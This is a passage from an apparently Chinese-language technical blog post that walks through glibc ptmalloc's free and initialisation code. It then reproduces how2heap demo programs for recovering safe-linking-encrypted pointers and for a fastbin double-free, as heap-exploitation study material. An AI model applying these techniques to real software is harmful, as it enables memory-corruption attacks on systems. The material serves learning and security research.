bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">    <span class="comment">//如果是large bin 范围的chunk，还需要设置fd_nextsize与bk_nextsize</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123; <span class="comment">//如果后面的chunk是top chunk，则直接把当前chunk合并进top chunk</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后如果free的chunk的大小超过了<code>FASTBIN_CONSOLIDATION_THRESHOLD</code>这个阈值，并且arena中存在fastchunks，则会调用<code>malloc_consolidate</code> 对fastbin的chunk进行一个合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br></pre></td></tr></table></figure><p>最后便是如果大小不再fastbin中，并且是mmaped来的，进入到了最后的else分支逻辑，调用<code>munmap_chunk</code>进行释放</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  munmap_chunk (p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>free的操作相较于malloc要简单很多，概括来说就是这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">_int_free</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">    视tcache情况，如果<span class="built_in">free</span>的chunk大小合适，tcache bin没满，则放到tcache bin 里</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">if</span>(大小满足fastbin范围)</span><br><span class="line">        &#123;</span><br><span class="line">            检查、放进fastbin里</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(chunk不是mmap得来的)</span><br><span class="line">        &#123;</span><br><span class="line">            检查</span><br><span class="line">            进行chunk的前向与后向合并。</span><br><span class="line">                <span class="keyword">if</span>(后向chunk不是top chunk)</span><br><span class="line">                &#123;</span><br><span class="line">                    判断是否合并</span><br><span class="line">                    然后把合并后的chunk放进unsorted bin中</span><br><span class="line">                &#125;<span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    top chunk扩展</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(size足够大)</span><br><span class="line">            &#123;</span><br><span class="line">                调用malloc_consolidate进行fastbin合并整理</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            mummap_chunk(p)</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h4 id="初始化操作"><a href="#初始化操作" class="headerlink" title="初始化操作"></a>初始化操作</h4><p><code>ptmalloc_init</code>函数大致流程如下(只保留了关键部分)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">ptmalloc_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  __malloc_initialized = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  tcache_key_initialize (); <span class="comment">//初始化tcache_key</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_MTAG</span></span><br><span class="line">  <span class="keyword">if</span> ((TUNABLE_GET_FULL (glibc, mem, tagging, <span class="keyword">int32_t</span>, <span class="literal">NULL</span>) &amp; <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If the tunable says that we should be using tagged memory</span></span><br><span class="line"><span class="comment"> and that morecore does not support tagged regions, then</span></span><br><span class="line"><span class="comment"> disable it.  */</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined SHARED &amp;&amp; IS_IN (libc)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__libc_initial)</span><br><span class="line">    __always_fail_morecore = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  thread_arena = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">  malloc_init_state (&amp;main_arena);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> HAVE_TUNABLES</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="comment">/* Force mmap for main arena instead of sbrk, so hugepages are explicitly</span></span><br><span class="line"><span class="comment">       used.  */</span></span><br><span class="line">    __always_fail_morecore = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (_environ != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是一个Tcache 的key初始化操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  tcache_key_initialize ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这个函数我们在之前分析tcache的宏的时候分析过,比较简单，根据字长获取一个32位/64位的随机数存放在<code>tcache_key</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_key_initialize (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有就是对<code>main_arena</code>进行初始化的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc_init_state (&amp;main_arena);</span><br></pre></td></tr></table></figure><p>这个函数定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">malloc_init_state (mstate av)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Establish circular links for normal bins */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">    &#125; <span class="comment">//初始化av对应的bins，bins中的每个bin对应的双向链表初始化</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  set_noncontiguous (av);</span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast (DEFAULT_MXFAST); <span class="comment">//设置fastbin，这个宏在之前整理fastbin相关的宏的时候整理过</span></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  av-&gt;top = initial_top (av);<span class="comment">//设置top_chunk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="各种攻击方式-选自how2heap以及零散整理"><a href="#各种攻击方式-选自how2heap以及零散整理" class="headerlink" title="各种攻击方式(选自how2heap以及零散整理)"></a>各种攻击方式(选自how2heap以及零散整理)</h1><p>在利用的过程中，我们也会对分配的思路有进一步的理解与熟悉。learn by hack。</p><h2 id="decrypt-safe-linking"><a href="#decrypt-safe-linking" class="headerlink" title="decrypt_safe_linking"></a>decrypt_safe_linking</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">long</span> cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;because of the 12bit sliding.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)&quot;</span>);</span><br><span class="line"><span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> plain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line"><span class="keyword">if</span>(bits &lt; <span class="number">0</span>) bits = <span class="number">0</span>;</span><br><span class="line">plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">key = plain &gt;&gt; <span class="number">12</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;round %d:\n&quot;</span>, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;key:    %#016lx\n&quot;</span>, key);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;plain:  %#016lx\n&quot;</span>, plain);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipher: %#016lx\n\n&quot;</span>, cipher);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This technique demonstrates how to recover the original content from a poisoned</span></span><br><span class="line"><span class="comment"> * value because of the safe-linking mechanism.</span></span><br><span class="line"><span class="comment"> * The attack uses the fact that the first 12 bit of the plaintext (pointer) is known</span></span><br><span class="line"><span class="comment"> * and the key (ASLR slide) is the same to the pointer&#x27;s leading bits.</span></span><br><span class="line"><span class="comment"> * As a result, as long as the chunk where the pointer is stored is at the same page</span></span><br><span class="line"><span class="comment"> * of the pointer itself, the value of the pointer can be fully recovered.</span></span><br><span class="line"><span class="comment"> * Otherwise, we can also recover the pointer with the page-offset between the storer</span></span><br><span class="line"><span class="comment"> * and the pointer. What we demonstrate here is a special case whose page-offset is 0. </span></span><br><span class="line"><span class="comment"> * For demonstrations of other more general cases, plz refer to </span></span><br><span class="line"><span class="comment"> * https://github.com/n132/Dec-Safe-Linking</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 1: allocate chunks</span></span><br><span class="line"><span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">long</span> *b = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;First, we create chunk a @ %p and chunk b @ %p\n&quot;</span>, a, b);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;And then create a padding chunk to prevent consolidation.&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// step 2: free chunks</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now free chunk a and then free chunk b.&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the freelist is: [%p -&gt; %p]\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Due to safe-linking, the value actually stored at b[0] is: %#lx\n&quot;</span>, b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3: recover the values</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now decrypt the poisoned value&quot;</span>);</span><br><span class="line"><span class="keyword">long</span> plaintext = decrypt(b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;value: %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;recovered value: %#lx\n&quot;</span>, plaintext);</span><br><span class="line">assert(plaintext == (<span class="keyword">long</span>)a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这个恢复过程有点像密码学中MT19937的过程。</p><p>我们知道在<code>tcache bin</code>以及<code>fastbin</code>里面对单向链表的指针域进行了一个加密的操作,其加密过程是这样的</p><script type="math/tex; mode=display">CipherPtr=(pos>>12)\oplus Ptr</script><p>其中<code>Ptr</code>是指向的下一个堆块地址，而<code>pos</code>是当前堆块的地址。</p><p>如果我们能求出($pos&gt;&gt;12$)，那么就能恢复出$Ptr$</p><p>但是我们注意到一点就是，在分配的chunk不多的情况下，下一个堆块的地址和当前堆块的地址 的高12位一定是一样的(因为在一个页面里面)</p><p>所以</p><script type="math/tex; mode=display">CipherPtr=(pos>>12)\oplus Ptr=(Ptr>>12)\oplus Ptr</script><p>而$Ptr&gt;&gt;12$的高12位为0，所以$CipherPtr$的高12位就是$Ptr$的高12位。求出了$Ptr$的高12位我们也就求出了$Ptr&gt;&gt;12$的前24位，进而求出了$Ptr$的24位，依此类推就能将$Ptr$全部还原</p><p>(当然这也有局限性，两个堆块必须在同一页面才行，否则可能需要一点点爆破或者干脆求不出来)</p><h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个应该是一个入门级的利用了</p><p>由于tcache bin不满的情况下free的堆块会先放进tcache bin中，所以先把tcache bin填满(一般最多7个就行了)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span 